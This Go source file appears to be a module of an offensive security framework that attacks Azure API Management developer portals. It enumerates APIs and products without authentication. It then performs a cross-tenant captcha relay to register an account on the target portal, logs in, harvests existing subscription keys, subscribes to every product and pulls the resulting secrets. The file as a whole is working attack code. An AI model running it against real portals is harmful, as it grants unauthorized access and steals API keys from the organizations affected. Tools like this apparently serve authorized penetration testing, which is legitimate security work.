package recon

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os"
	"maps"
	"strings"
	"time"

	"github.com/praetorian-inc/aurelian/pkg/model"
	"github.com/praetorian-inc/aurelian/pkg/output"
	"github.com/praetorian-inc/aurelian/pkg/pipeline"
	"github.com/praetorian-inc/aurelian/pkg/plugin"
)

func init() {
	plugin.Register(&APIMCrossTenantModule{})
}

type APIMCrossTenantConfig struct {
	TargetAPIM   string `param:"target"       desc:"Target APIM developer portal URL"                                      required:"true"`
	AttackerAPIM string `param:"attacker"     desc:"Attacker-controlled APIM portal URL (enables cross-tenant signup bypass)"`
	Email        string `param:"email"        desc:"Registration email (requires --attacker or --skip-signup)"`
	Password     string `param:"password"     desc:"Registration password (requires --attacker or --skip-signup)"           sensitive:"true"`
	FirstName    string `param:"first"        desc:"First name for registration"                                           default:"Test"`
	LastName     string `param:"last"         desc:"Last name for registration"                                            default:"User"`
	Insecure     bool   `param:"insecure"     desc:"Skip TLS certificate verification"                                      default:"false" shortcode:"k"`
	SkipSignup   bool   `param:"skip-signup"  desc:"Skip captcha/signup steps; login and enumerate with existing credentials" default:"false"`
	SkipPreauth  bool   `param:"skip-preauth" desc:"Skip unauthenticated pre-auth enumeration phase"                         default:"false"`
}

func (c *APIMCrossTenantConfig) PostBind(_ plugin.Config, _ plugin.Module) error {
	if c.SkipSignup {
		if c.Email == "" || c.Password == "" {
			return fmt.Errorf("--skip-signup requires both --email and --password")
		}
		return nil
	}
	if c.AttackerAPIM != "" && (c.Email == "" || c.Password == "") {
		return fmt.Errorf("--attacker requires both --email and --password")
	}
	return nil
}

type APIMCrossTenantModule struct {
	APIMCrossTenantConfig
}

func (m *APIMCrossTenantModule) ID() string          { return "apim-cross-tenant" }
func (m *APIMCrossTenantModule) Name() string        { return "Azure APIM Cross-Tenant Signup" }
func (m *APIMCrossTenantModule) Platform() plugin.Platform { return plugin.PlatformAzure }
func (m *APIMCrossTenantModule) Category() plugin.Category { return plugin.CategoryRecon }
func (m *APIMCrossTenantModule) OpsecLevel() string  { return "loud" }
func (m *APIMCrossTenantModule) Authors() []string   { return []string{"Praetorian"} }
func (m *APIMCrossTenantModule) Parameters() any     { return &m.APIMCrossTenantConfig }
func (m *APIMCrossTenantModule) SupportedResourceTypes() []string { return nil }

func (m *APIMCrossTenantModule) Description() string {
	return "Enumerates Azure APIM developer portal resources (APIs, products, delegation settings) " +
		"without authentication, then optionally performs a cross-tenant captcha relay attack to " +
		"create an account on the target portal and enumerate authenticated resources and subscription keys."
}

func (m *APIMCrossTenantModule) References() []string {
	return []string{
		"https://learn.microsoft.com/en-us/azure/api-management/api-management-key-concepts",
	}
}

func (m *APIMCrossTenantModule) Run(cfg plugin.Config, out *pipeline.P[model.AurelianModel]) error {
	client := m.buildHTTPClient()
	target := strings.TrimRight(m.TargetAPIM, "/")

	mgmtURL, mgmtVersion, err := m.fetchConfig(client, target)
	if err != nil {
		return fmt.Errorf("fetching APIM config: %w", err)
	}

	cfg.Info("management API: %s (version: %s)", mgmtURL, mgmtVersion)

	if !m.SkipPreauth {
		if err := m.enumPublic(client, target, mgmtURL, mgmtVersion, out); err != nil {
			return fmt.Errorf("pre-auth enumeration: %w", err)
		}
	}

	if m.SkipSignup {
		return m.loginAndEnum(cfg, client, target, mgmtURL, mgmtVersion, out)
	}

	if m.AttackerAPIM == "" {
		return nil
	}

	return m.bypassAndEnumAuthenticated(cfg, client, target, mgmtURL, mgmtVersion, out)
}

// loginAndEnum skips signup and goes straight to login + authenticated enumeration.
func (m *APIMCrossTenantModule) loginAndEnum(cfg plugin.Config, client *http.Client, target, mgmtURL, mgmtVersion string, out *pipeline.P[model.AurelianModel]) error {
	sasToken, userID, err := m.login(client, target, mgmtVersion)
	if err != nil {
		return fmt.Errorf("login failed: %w", err)
	}
	cfg.Success("login successful — user ID: %s", userID)
	authHeaders := map[string]string{"Authorization": "SharedAccessSignature " + sasToken}
	m.enumAuthenticated(client, target, mgmtURL, mgmtVersion, userID, authHeaders, out)
	return nil
}

// enumPublic enumerates unauthenticated APIM management API endpoints.
func (m *APIMCrossTenantModule) enumPublic(client *http.Client, target, mgmtURL, mgmtVersion string, out *pipeline.P[model.AurelianModel]) error {
	for _, res := range []struct {
		path        string
		resourceType string
	}{
		{"apis", "Microsoft.ApiManagement/service/apis"},
		{"products", "Microsoft.ApiManagement/service/products"},
	} {
		url := fmt.Sprintf("%s/%s?api-version=%s", mgmtURL, res.path, mgmtVersion)
		var resp apimListResponse
		if err := m.doJSON(client, http.MethodGet, url, nil, nil, &resp); err != nil {
			slog.Warn("pre-auth enumeration failed", "resource", res.path, "error", err)
			continue
		}
		for _, item := range resp.Value {
			props := item.Properties
			r := output.NewAzureResource("", res.resourceType, item.ID)
			r.DisplayName = stringOrEmpty(props["displayName"])
			r.Properties = map[string]any{
				"path":                 props["path"],
				"description":          props["description"],
				"subscriptionRequired": props["subscriptionRequired"],
				"state":                props["state"],
			}
			out.Send(r)
		}
	}

	// Delegation settings exposure check.
	delegURL := fmt.Sprintf("%s/portalsettings/delegation?api-version=%s", mgmtURL, mgmtVersion)
	var delegResp struct {
		Properties map[string]any `json:"properties"`
	}
	if err := m.doJSON(client, http.MethodGet, delegURL, nil, nil, &delegResp); err != nil {
		slog.Warn("delegation settings check failed", "error", err)
	} else if len(delegResp.Properties) > 0 {
		ctx, _ := json.Marshal(delegResp.Properties)
		out.Send(output.AurelianRisk{
			Name:               "apim-delegation-settings-exposed",
			Severity:           output.RiskSeverityMedium,
			ImpactedResourceID: target,
			DeduplicationID:    target + "/delegation",
			Context:            ctx,
		})
	}

	return nil
}

// bypassAndEnumAuthenticated performs the cross-tenant captcha relay signup and
// enumerates authenticated APIM resources.
func (m *APIMCrossTenantModule) bypassAndEnumAuthenticated(cfg plugin.Config, client *http.Client, target, mgmtURL, mgmtVersion string, out *pipeline.P[model.AurelianModel]) error {
	attacker := strings.TrimRight(m.AttackerAPIM, "/")

	// Fetch captcha from attacker APIM.
	var captcha apimCaptchaResponse
	captchaURL := fmt.Sprintf("%s/captcha-challenge?challengeType=visual", attacker)
	if err := m.doJSON(client, http.MethodGet, captchaURL, nil, map[string]string{"Origin": attacker}, &captcha); err != nil {
		return fmt.Errorf("fetching captcha: %w", err)
	}

	// Decode and save captcha image for user to solve.
	imgBytes, err := base64.StdEncoding.DecodeString(captcha.ChallengeString)
	if err != nil {
		return fmt.Errorf("decoding captcha image: %w", err)
	}
	tmpFile, err := os.CreateTemp("", "apim-captcha-*.png")
	if err != nil {
		return fmt.Errorf("creating captcha temp file: %w", err)
	}
	defer os.Remove(tmpFile.Name())
	if _, err := tmpFile.Write(imgBytes); err != nil {
		return fmt.Errorf("writing captcha image: %w", err)
	}
	tmpFile.Close()

	cfg.Info("captcha saved to %s", tmpFile.Name())
	fmt.Fprint(os.Stderr, "Enter captcha solution: ")
	solution, err := bufio.NewReader(os.Stdin).ReadString('\n')
	if err != nil {
		return fmt.Errorf("reading captcha solution: %w", err)
	}
	solution = strings.TrimSpace(solution)

	// POST signup to target with attacker's captcha (cross-tenant bypass).
	signupPayload := apimSignupRequest{
		Challenge: apimChallenge{
			TestCaptchaRequest: apimCaptchaRequest{
				ChallengeID:   captcha.ChallengeID,
				InputSolution: solution,
			},
			AzureRegion:   captcha.AzureRegion,
			ChallengeType: "visual",
		},
		SignupData: apimSignupData{
			Email:        m.Email,
			FirstName:    m.FirstName,
			LastName:     m.LastName,
			Password:     m.Password,
			Confirmation: "signup",
			AppType:      "developerPortal",
		},
	}
	signupHeaders := map[string]string{
		"Content-Type": "application/json",
		"Origin":       attacker,
		"Referer":      attacker + "/signup",
	}
	var signupResp any
	if err := m.doJSON(client, http.MethodPost, target+"/signup", signupPayload, signupHeaders, &signupResp); err != nil {
		return fmt.Errorf("signup request failed: %w", err)
	}

	cfg.Info("signup submitted — check %s for a confirmation email, then press Enter", m.Email)
	fmt.Fprint(os.Stderr, "Press Enter once confirmed (or if no email required): ")
	if _, err := bufio.NewReader(os.Stdin).ReadString('\n'); err != nil {
		return fmt.Errorf("reading confirmation: %w", err)
	}

	// Login via Basic Auth to get SAS token.
	sasToken, userID, err := m.login(client, target, mgmtVersion)
	if err != nil {
		return fmt.Errorf("login failed: %w", err)
	}

	cfg.Success("login successful — user ID: %s", userID)

	out.Send(output.AurelianRisk{
		Name:               "apim-cross-tenant-signup-bypass",
		Severity:           output.RiskSeverityHigh,
		ImpactedResourceID: target,
		DeduplicationID:    target,
	})

	authHeaders := map[string]string{
		"Authorization": "SharedAccessSignature " + sasToken,
	}

	m.enumAuthenticated(client, target, mgmtURL, mgmtVersion, userID, authHeaders, out)

	return nil
}

// login authenticates via Basic Auth and returns the SAS token and user ID.
func (m *APIMCrossTenantModule) login(client *http.Client, target, mgmtVersion string) (sasToken, userID string, err error) {
	loginURL := fmt.Sprintf("%s/developer/identity?api-version=%s", target, mgmtVersion)
	req, err := http.NewRequest(http.MethodGet, loginURL, nil)
	if err != nil {
		return "", "", err
	}
	req.Header.Set("Authorization", "Basic "+basicAuth(m.Email, m.Password))
	req.Header.Set("Origin", target)

	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", "", fmt.Errorf("login returned %d", resp.StatusCode)
	}

	sasToken = resp.Header.Get("ocp-apim-sas-token")
	if sasToken == "" {
		return "", "", fmt.Errorf("no ocp-apim-sas-token in login response")
	}

	var identity struct {
		ID string `json:"id"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&identity); err != nil {
		return "", "", fmt.Errorf("decoding identity response: %w", err)
	}

	return sasToken, identity.ID, nil
}

// enumAuthenticated enumerates APIM resources using the SAS token.
func (m *APIMCrossTenantModule) enumAuthenticated(client *http.Client, target, mgmtURL, mgmtVersion, userID string, headers map[string]string, out *pipeline.P[model.AurelianModel]) {
	// APIs with operations.
	var apiList apimListResponse
	apiURL := fmt.Sprintf("%s/apis?api-version=%s", mgmtURL, mgmtVersion)
	if err := m.doJSON(client, http.MethodGet, apiURL, nil, headers, &apiList); err != nil {
		slog.Warn("authenticated API enumeration failed", "error", err)
	} else {
		for _, item := range apiList.Value {
			props := item.Properties
			r := output.NewAzureResource("", "Microsoft.ApiManagement/service/apis", item.ID)
			r.DisplayName = stringOrEmpty(props["displayName"])
			r.Properties = map[string]any{
				"path":                 props["path"],
				"description":          props["description"],
				"subscriptionRequired": props["subscriptionRequired"],
				"serviceUrl":           props["serviceUrl"],
				"apiRevision":          props["apiRevision"],
			}
			// Fetch operations for this API.
			ops := m.fetchOperations(client, mgmtURL, mgmtVersion, item.Name, headers)
			if len(ops) > 0 {
				r.Properties["operations"] = ops
			}
			out.Send(r)
		}
	}

	// Products.
	var productList apimListResponse
	productURL := fmt.Sprintf("%s/products?api-version=%s", mgmtURL, mgmtVersion)
	if err := m.doJSON(client, http.MethodGet, productURL, nil, headers, &productList); err != nil {
		slog.Warn("authenticated product enumeration failed", "error", err)
	} else {
		for _, item := range productList.Value {
			props := item.Properties
			r := output.NewAzureResource("", "Microsoft.ApiManagement/service/products", item.ID)
			r.DisplayName = stringOrEmpty(props["displayName"])
			r.Properties = map[string]any{
				"state":            props["state"],
				"approvalRequired": props["approvalRequired"],
				"subscriptionRequired": props["subscriptionRequired"],
			}
			out.Send(r)
		}
	}

	// Existing subscriptions with keys.
	var subList apimListResponse
	subURL := fmt.Sprintf("%s/subscriptions?api-version=%s", mgmtURL, mgmtVersion)
	if err := m.doJSON(client, http.MethodGet, subURL, nil, headers, &subList); err != nil {
		slog.Warn("subscription enumeration failed", "error", err)
	} else {
		for _, item := range subList.Value {
			props := item.Properties
			primaryKey := stringOrEmpty(props["primaryKey"])
			secondaryKey := stringOrEmpty(props["secondaryKey"])
			if primaryKey == "" && secondaryKey == "" {
				continue
			}
			ctx, _ := json.Marshal(map[string]string{
				"subscription_name": item.Name,
				"primary_key":       primaryKey,
				"secondary_key":     secondaryKey,
				"scope":             stringOrEmpty(props["scope"]),
			})
			out.Send(output.AurelianRisk{
				Name:               "apim-exposed-subscription-key",
				Severity:           output.RiskSeverityCritical,
				ImpactedResourceID: target,
				DeduplicationID:    target + "/" + item.Name,
				Context:            ctx,
			})
		}
	}

	// Groups.
	var groupList apimListResponse
	groupURL := fmt.Sprintf("%s/groups?api-version=%s", mgmtURL, mgmtVersion)
	if err := m.doJSON(client, http.MethodGet, groupURL, nil, headers, &groupList); err != nil {
		slog.Warn("group enumeration failed", "error", err)
	} else {
		for _, item := range groupList.Value {
			props := item.Properties
			r := output.NewAzureResource("", "Microsoft.ApiManagement/service/groups", item.ID)
			r.DisplayName = stringOrEmpty(props["displayName"])
			r.Properties = map[string]any{
				"type":        props["type"],
				"builtIn":     props["builtIn"],
				"description": props["description"],
			}
			out.Send(r)
		}
	}

	// Attempt to subscribe to all products.
	if userID != "" {
		m.trySubscribeAll(client, mgmtURL, mgmtVersion, userID, target, headers, out)
	}
}

// fetchOperations retrieves HTTP operations for a single API.
func (m *APIMCrossTenantModule) fetchOperations(client *http.Client, mgmtURL, mgmtVersion, apiName string, headers map[string]string) []map[string]any {
	url := fmt.Sprintf("%s/apis/%s/operations?api-version=%s", mgmtURL, apiName, mgmtVersion)
	var resp apimListResponse
	if err := m.doJSON(client, http.MethodGet, url, nil, headers, &resp); err != nil {
		slog.Warn("operation enumeration failed", "api", apiName, "error", err)
		return nil
	}
	ops := make([]map[string]any, 0, len(resp.Value))
	for _, item := range resp.Value {
		ops = append(ops, map[string]any{
			"name":        item.Name,
			"method":      item.Properties["method"],
			"urlTemplate": item.Properties["urlTemplate"],
			"displayName": item.Properties["displayName"],
		})
	}
	return ops
}

// trySubscribeAll attempts to subscribe the authenticated user to every product.
func (m *APIMCrossTenantModule) trySubscribeAll(client *http.Client, mgmtURL, mgmtVersion, userID, target string, headers map[string]string, out *pipeline.P[model.AurelianModel]) {
	var productList apimListResponse
	productURL := fmt.Sprintf("%s/products?api-version=%s", mgmtURL, mgmtVersion)
	if err := m.doJSON(client, http.MethodGet, productURL, nil, headers, &productList); err != nil {
		slog.Warn("product list for subscription failed", "error", err)
		return
	}

	for _, product := range productList.Value {
		productID := product.Name
		if productID == "" {
			// Fall back to last segment of ID.
			parts := strings.Split(product.ID, "/")
			productID = parts[len(parts)-1]
		}
		subName := "poc-" + productID
		scope := fmt.Sprintf("%s/products/%s", mgmtURL, productID)
		endpoint := fmt.Sprintf("%s/users/%s/subscriptions/%s?api-version=%s", mgmtURL, userID, subName, mgmtVersion)

		subPayload := map[string]any{
			"properties": map[string]any{
				"scope":       scope,
				"displayName": subName,
			},
		}
		putHeaders := maps.Clone(headers)
		putHeaders["Content-Type"] = "application/json"

		var putResp any
		if err := m.doJSON(client, http.MethodPut, endpoint, subPayload, putHeaders, &putResp); err != nil {
			// 409 means already subscribed — still fetch keys below.
			if !strings.HasPrefix(err.Error(), "HTTP 409") {
				slog.Warn("product subscription failed", "product", productID, "error", err)
				continue
			}
		}

		// listSecrets returns the actual keys (GET omits them).
		secretsURL := fmt.Sprintf("%s/users/%s/subscriptions/%s/listSecrets?api-version=%s", mgmtURL, userID, subName, mgmtVersion)
		var secrets struct {
			PrimaryKey   string `json:"primaryKey"`
			SecondaryKey string `json:"secondaryKey"`
		}
		if err := m.doJSON(client, http.MethodPost, secretsURL, struct{}{}, headers, &secrets); err != nil {
			slog.Warn("subscription key retrieval failed", "product", productID, "error", err)
			continue
		}

		primaryKey := secrets.PrimaryKey
		secondaryKey := secrets.SecondaryKey
		productName := stringOrEmpty(product.Properties["displayName"])

		ctx, _ := json.Marshal(map[string]string{
			"product_name":      productName,
			"subscription_name": subName,
			"primary_key":       primaryKey,
			"secondary_key":     secondaryKey,
			"scope":             scope,
		})
		out.Send(output.AurelianRisk{
			Name:               "apim-auto-subscribed-key",
			Severity:           output.RiskSeverityCritical,
			ImpactedResourceID: target,
			DeduplicationID:    target + "/" + subName,
			Context:            ctx,
		})
	}
}

// fetchConfig retrieves the APIM portal config.json and returns the management API URL and version.
func (m *APIMCrossTenantModule) fetchConfig(client *http.Client, target string) (mgmtURL, mgmtVersion string, err error) {
	var cfg struct {
		ManagementAPIURL     string `json:"managementApiUrl"`
		ManagementAPIVersion string `json:"managementApiVersion"`
	}
	if err := m.doJSON(client, http.MethodGet, target+"/config.json", nil, nil, &cfg); err != nil {
		return "", "", err
	}
	if cfg.ManagementAPIURL == "" {
		return "", "", fmt.Errorf("managementApiUrl not found in config.json")
	}
	version := cfg.ManagementAPIVersion
	if version == "" {
		version = "2022-04-01-preview"
	}
	return strings.TrimRight(cfg.ManagementAPIURL, "/"), version, nil
}

// doJSON executes an HTTP request with an optional JSON body and decodes the response into out.
func (m *APIMCrossTenantModule) doJSON(client *http.Client, method, url string, body, headers any, out any) error {
	var bodyReader io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return fmt.Errorf("marshaling request body: %w", err)
		}
		bodyReader = bytes.NewReader(b)
	}

	req, err := http.NewRequest(method, url, bodyReader)
	if err != nil {
		return err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	req.Header.Set("Accept", "application/json")

	if h, ok := headers.(map[string]string); ok {
		for k, v := range h {
			req.Header.Set(k, v)
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
		return fmt.Errorf("HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(body)))
	}

	if out != nil {
		if err := json.NewDecoder(resp.Body).Decode(out); err != nil && err != io.EOF {
			return fmt.Errorf("decoding response: %w", err)
		}
	}
	return nil
}

// buildHTTPClient creates an HTTP client that honors the Insecure flag.
func (m *APIMCrossTenantModule) buildHTTPClient() *http.Client {
	transport := http.DefaultTransport.(*http.Transport).Clone()
	if m.Insecure {
		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} //nolint:gosec
	}
	return &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
		CheckRedirect: func(req *http.Request, _ []*http.Request) error {
			if req.URL.Scheme != "https" && !m.Insecure {
				return fmt.Errorf("refusing non-HTTPS redirect to %s", req.URL)
			}
			return nil
		},
	}
}

func basicAuth(email, password string) string {
	return base64.StdEncoding.EncodeToString([]byte(email + ":" + password))
}

func stringOrEmpty(v any) string {
	if v == nil {
		return ""
	}
	s, _ := v.(string)
	return s
}

// apimListResponse is the common envelope for paginated APIM management API responses.
type apimListResponse struct {
	Value []apimItem `json:"value"`
}

type apimItem struct {
	ID         string         `json:"id"`
	Name       string         `json:"name"`
	Properties map[string]any `json:"properties"`
}

type apimCaptchaResponse struct {
	ChallengeID     string `json:"ChallengeId"`
	AzureRegion     string `json:"AzureRegion"`
	ChallengeString string `json:"ChallengeString"`
}

type apimSignupRequest struct {
	Challenge  apimChallenge  `json:"challenge"`
	SignupData apimSignupData `json:"signupData"`
}

type apimChallenge struct {
	TestCaptchaRequest apimCaptchaRequest `json:"testCaptchaRequest"`
	AzureRegion        string             `json:"azureRegion"`
	ChallengeType      string             `json:"challengeType"`
}

type apimCaptchaRequest struct {
	ChallengeID   string `json:"challengeId"`
	InputSolution string `json:"inputSolution"`
}

type apimSignupData struct {
	Email        string `json:"email"`
	FirstName    string `json:"firstName"`
	LastName     string `json:"lastName"`
	Password     string `json:"password"`
	Confirmation string `json:"confirmation"`
	AppType      string `json:"appType"`
}
